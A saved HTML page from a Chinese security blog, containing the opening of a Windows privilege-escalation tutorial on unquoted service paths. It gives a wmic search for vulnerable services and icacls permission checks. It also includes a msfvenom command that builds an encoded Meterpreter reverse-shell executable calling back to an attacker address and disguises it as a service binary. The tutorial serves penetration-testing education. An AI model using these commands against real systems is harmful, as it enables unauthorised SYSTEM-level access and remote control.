@@ -1,0 +1,2033 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="..">
+      
+      
+        <link rel="next" href="../Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.3">
+    
+    
+      
+        <title>Windows提权入门刊 - ConsT27's Blog|要做一个低素质玩家</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.c4a75a56.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.a0c5b2b5.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#windows" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="ConsT27&#39;s Blog|要做一个低素质玩家" class="md-header__button md-logo" aria-label="ConsT27's Blog|要做一个低素质玩家" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            ConsT27's Blog|要做一个低素质玩家
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Windows提权入门刊
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="ConsT27&#39;s Blog|要做一个低素质玩家" class="md-nav__button md-logo" aria-label="ConsT27's Blog|要做一个低素质玩家" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    ConsT27's Blog|要做一个低素质玩家
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../about/" class="md-nav__link">
+        About
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          提权
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          提权
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Windows提权入门刊
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Windows提权入门刊
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#trusted-service-paths" class="md-nav__link">
+    无引号服务路径 （ Trusted Service Paths ）
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerable-services" class="md-nav__link">
+    易受攻击的服务（Vulnerable Services ）
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alwaysinstallelevated" class="md-nav__link">
+    AlwaysInstallElevated
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    信息泄露
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    基于资源的域委派攻击
+  </a>
+  
+    <nav class="md-nav" aria-label="基于资源的域委派攻击">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    原理的几个点：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    攻击流程:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    实操
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    敏感用户不可委派的绕过
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#potato" class="md-nav__link">
+    POTATO 家族
+  </a>
+  
+    <nav class="md-nav" aria-label="POTATO 家族">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hot-potato" class="md-nav__link">
+    hot potato
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mysql" class="md-nav__link">
+    MYSQL下的提权技术
+  </a>
+  
+    <nav class="md-nav" aria-label="MYSQL下的提权技术">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mof" class="md-nav__link">
+    MOF提权
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#udf" class="md-nav__link">
+    UDF提权
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    启动项提权
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    命名管道提权
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    令牌窃取
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        Linux提权入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bypass%20UAC/" class="md-nav__link">
+        BypassUAC入门刊
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          内网渗透
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          内网渗透
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows内网基础概览.md" class="md-nav__link">
+        Windows内网渗透入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Windows内网渗透信息搜集指令大全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        ARP欺骗&DNS欺骗&mac泛洪攻击
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Windows名称解析与相应攻击方法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        横向移动与域控权限维持方法总汇
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        超级水文我自己都不想看第二遍的Mimikatz分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        powershell脚本的分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        家人们来学习代理怎么用
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          权限维持
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          权限维持
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        win&linux本地权限维持入门刊
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          JAVA安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          JAVA安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        java安全入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        7u21链浅析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        JNDI注入原理浅析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        CommonsBeanUtils 反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        RMI ATTACK,攻击RMi
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        C3P0链
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Hessian反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        shiro反序列化(shiro-550与shiro-721)
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Spel表达式注入&相关组件的Spel表达式注入分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        ognl 注入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Log4j2 RCE
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        看我教你怎么打烂Mybatis（指审计）
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅析Weblogic 反序列化漏洞
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        java agent内存马
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Spring Controller内存马
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        tomcat Listener，Filter内存马简要分析
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+          钓鱼
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          钓鱼
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        钓鱼技巧入门杂烩
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          免杀
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          免杀
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        基础免杀手法暴风吸入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        WEB人从0开始用C++写一个加壳器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+          一些应用的攻击方式
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          一些应用的攻击方式
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        常见中间件的攻击方式入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        redis攻击方式入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        MongoDB 注入入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        针对EXCHANGE的攻击方式
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          一些云相关应用的攻击方式
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          一些云相关应用的攻击方式
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么日烂k8s
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么日烂Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅日一下AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅日一下阿里云
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        云原生概念入门刊
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+          乐子
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          乐子
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么在valorant玩sova打烂东南亚猴子的狗头
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        牛批轰轰的深度学习大览
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#trusted-service-paths" class="md-nav__link">
+    无引号服务路径 （ Trusted Service Paths ）
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerable-services" class="md-nav__link">
+    易受攻击的服务（Vulnerable Services ）
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alwaysinstallelevated" class="md-nav__link">
+    AlwaysInstallElevated
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    信息泄露
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    基于资源的域委派攻击
+  </a>
+  
+    <nav class="md-nav" aria-label="基于资源的域委派攻击">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    原理的几个点：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    攻击流程:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    实操
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    敏感用户不可委派的绕过
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#potato" class="md-nav__link">
+    POTATO 家族
+  </a>
+  
+    <nav class="md-nav" aria-label="POTATO 家族">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hot-potato" class="md-nav__link">
+    hot potato
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mysql" class="md-nav__link">
+    MYSQL下的提权技术
+  </a>
+  
+    <nav class="md-nav" aria-label="MYSQL下的提权技术">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mof" class="md-nav__link">
+    MOF提权
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#udf" class="md-nav__link">
+    UDF提权
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    启动项提权
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    命名管道提权
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    令牌窃取
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="windows">Windows提权</h1>
+<h2 id="trusted-service-paths">无引号服务路径 （ <strong>Trusted Service Paths</strong> ）</h2>
+<p>先说实用度，比较被动，而且比较看脸。</p>
+<p>Windows下服务的权限通常是SYSTEM。如果我们能够替换服务的启动程序为我们的恶意程序（如反弹shell），即相当于获得了SYSTEM权限，达到了提权的目的。
+无引号服务路径有可能会导致这种情况的发生。
+所谓无引号服务路径，就是服务启动程序的路径中包含了空格且未被引号包含起来。比如这样</p>
+<pre><code class="language-纯文本">C:\Program Files\floder1\service.exe
+</code></pre>
+<p>因为空格的存在，Windows在启动服务找寻服务启动项时，它会按照以下顺序进行启动项寻找</p>
+<pre><code class="language-纯文本">C:\Program.exe
+C:\Program Files\Some.exe
+C:\Program Files\Some Folder\Service.exe
+</code></pre>
+<p>这就给了我们有机可乘的机会：如果我们在服务的上层目录有写入或完全控制权限，我们完全可以将一个可执行文件放在Windows搜寻服务启动项的更靠前顺序上。</p>
+<p><img alt="QQ截图20210217143921" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143921.png" title="QQ截图20210217143921" /></p>
+<p>我们用以下命令来搜索哪些服务路径没有包含引号</p>
+<pre><code class="language-纯文本">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;
+</code></pre>
+<p>找到一个。接下来我们的思路可能就是在2345Explorer目录下创建一个Protect.exe了，所以我们要看看2345Explorer目录我们的权限如何。</p>
+<p>先来一手whoami /all.发现自己是Users组的。</p>
+<p><img alt="QQ截图20210217143934" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143934.png" title="QQ截图20210217143934" /></p>
+<p>然后使用icacls命令查看在2345Explorer目录的权限如何</p>
+<p><img alt="QQ截图20210217143945" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143945.png" title="QQ截图20210217143945" /></p>
+<p>users组是完全控制权（F），那么我们直接用msfvenom构造一个反弹shell的exe。命名为Protect.exe，放入2345Explorer目录。我这里随便编码了一下</p>
+<pre><code class="language-纯文本"> msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai LHOST=192.168.111.129 LPORT=10068 -f exe -o Protect.exe
+</code></pre>
